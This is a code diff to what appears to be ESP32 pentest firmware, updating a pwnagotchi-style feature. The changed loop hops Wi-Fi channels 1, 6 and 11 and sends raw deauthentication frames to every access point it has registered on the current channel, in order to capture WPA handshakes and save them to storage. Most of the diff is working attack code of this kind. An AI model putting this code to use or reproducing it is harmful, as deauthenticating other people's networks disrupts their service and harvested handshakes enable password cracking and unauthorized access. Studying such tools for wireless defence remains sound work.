@@ -9,6 +9,7 @@ Thanks to @bmorcelli for his help doing a better code.
 
 #include <Arduino.h>
 #include "core/mykeyboard.h"
+#include "core/wifi_common.h"
 #include "ui.h"
 #include "spam.h"
 #include "../wifi/sniffer.h"
@@ -46,12 +47,14 @@ void pwnagotchi_update() {
     if (state == STATE_WAKE) {
       checkPwngridGoneFriends();
       current_channel++; // Sniffer ch variable
-      if (current_channel == 15) {
-        current_channel = 1;
+      // It will hop through channels 1, 6 and 11 for better performance (most Wifi run in these channels, and by interference we can get 2 before and after the target)
+      // it will make us save space on registeredBeacon array, because we find the same beacon in 3 or 4 different channels (same MAC)
+      uint8_t chan[3] = {1,6,11};
+      if (current_channel == 3) {
+        current_channel = 0;
       }
-      ch=current_channel;
-      advertise(current_channel);
-      
+      ch=chan[current_channel];
+      advertise(chan[current_channel]);
     }
     updateUi(true);
 }
@@ -66,7 +69,7 @@ void wakeUp() {
 
 void advertise(uint8_t channel) {
   uint32_t elapsed = millis() - last_mood_switch;
-  if (elapsed > 8000) {
+  if (elapsed > 2500) {
     setMood(random(2, getNumberOfMoods() - 1)); //random mood
     last_mood_switch = millis();
   }
@@ -90,38 +93,29 @@ void set_pwnagotchi_exit(bool new_value) {
 }
 
 void pwnagotchi_start() {
-  int tmp = 0;
+  int tmp = 0;            // Control workflow
+  bool shot=false;        // Control deauth faces
+  bool pwgrid_done=false; // Control to start advertising
+  bool Deauth_done=false; // Control to start deauth
+  uint8_t _times=0;       // control delays without impacting control btns
 
   tft.fillScreen(BGCOLOR);
+  registeredBeacons.clear(); // Clear the registeredBeacon array in case it has something
+  delay(300);  // Due to select button pressed to enter / quit this feature*
 
-  pwnagotchi_setup();
-  delay(300); // Due to select button pressed to enter / quit this feature*
-
+  pwnagotchi_setup(); // Starts the thing
   // Draw footer & header
   drawTopCanvas();
   drawBottomCanvas();
   memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default)); // prepares the Deauth frame
-
-  bool pwgrid_done=false;
-  bool Handshake_done=false;
   _only_HS=true; // Pwnagochi only looks for handshakes
-  drawMood("(^>_<^)","Scanning networks..");
-  
-  int nets;
-  registeredBeacons.clear();
-  nets=WiFi.scanNetworks();
-  for(int i=0; i<nets; i++){
-    BeaconList beacon;
-    beacon.channel=(uint8_t)WiFi.channel(i);
-    memcpy(beacon.MAC,WiFi.BSSID(i),6);
-    registeredBeacons.insert(beacon);
-  }
 
   #if defined(HAS_TOUCH)
     TouchFooter();
   #endif
   pwnagotchi_update();
-  bool shot=false;
+
+  //Check where to save the Handshakes
   if(setupSdCard()) {
     isLittleFS=false;
     if (SD.exists("/BrucePCAP")) SD.mkdir("/BrucePCAP");
@@ -129,37 +123,48 @@ void pwnagotchi_start() {
     if (LittleFS.exists("/BrucePCAP/handshakes")) LittleFS.mkdir("/BrucePCAP/handshakes");
     isLittleFS = true;
   }
+  tmp=millis();
+  // LET'S GOOOOO!!!
   while(true) {
-    if(millis()-tmp<2000 && !Handshake_done)  {
-      Handshake_done=true;
+    if(millis()-tmp<2000 && !Deauth_done)  {
+      Deauth_done=true;
       drawMood("(-@_@)","Preparing Deauth Sniper");
     }
-    if(millis()-tmp>2000 && Handshake_done && !pwgrid_done) {
+    if(millis()-tmp>(2000+1000*_times) && Deauth_done && !pwgrid_done) {
+
+      if(registeredBeacons.size()>40) registeredBeacons.clear(); // Clear registered beacons to restart search and avoir restarts
+      Serial.println("<<---- Starting Deauthentication Process ---->>");
       for(auto registeredBeacon:registeredBeacons) {
-        Serial.println(String(registeredBeacon.MAC,HEX) + " on ch" + String(registeredBeacon.channel) + " -> desired ch " + String(ch));
+        char _MAC[20];
+        sprintf(_MAC, "%02X:%02X:%02X:%02X:%02X:%02X", 
+            registeredBeacon.MAC[0], registeredBeacon.MAC[1], registeredBeacon.MAC[2], registeredBeacon.MAC[3], registeredBeacon.MAC[4], registeredBeacon.MAC[5]);
+        Serial.println(String(_MAC) + " on ch" + String(registeredBeacon.channel) + " -> we are now on ch " + String(ch));
         if(registeredBeacon.channel==ch) {
           memcpy(&ap_record.bssid,registeredBeacon.MAC, 6);
           wsl_bypasser_send_raw_frame(&ap_record,registeredBeacon.channel); //writes the buffer with the information
           send_raw_frame(deauth_frame,26);
         }
       }
+      Serial.println("<<---- Stopping Deauthentication Process ---->>");
       drawMood(shot?"(<<_<<)":"(>>_>>)",shot?"Lasers Activated! Deauthing":"pew! pew! pew!");
-      delay(500);
+      _times++;
       shot=!shot;
     }
     if(millis()-tmp>12000 && pwgrid_done==false){
       drawMood("(^__^)","Lets Make Friends!");
+      _times=0;
       pwgrid_done=true;
     }
-    if(pwgrid_done) {
-      delay(3000);
+    if(pwgrid_done && millis()-tmp>(12000+ 3000*_times)) {
+      _times++;
       advertise(ch);
       updateUi(true);
     }
     if(millis()-tmp>29500) {
+      _times=0;
       tmp=millis();
       pwgrid_done=false;
-      Handshake_done=false;
+      Deauth_done=false;
       pwnagotchi_update();
     }
     if (checkSelPress()) {
@@ -173,12 +178,16 @@ void pwnagotchi_start() {
       loopOptions(options);
       // Redraw footer & header
       tft.fillScreen(BGCOLOR);
-      drawTopCanvas();
-      drawBottomCanvas();
+      updateUi(true);
     }
     if (pwnagotchi_exit) {
       break;
     }
     delay(50);
   }
+
+  // Turn off WiFi
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+  wifiDisconnect();
 }
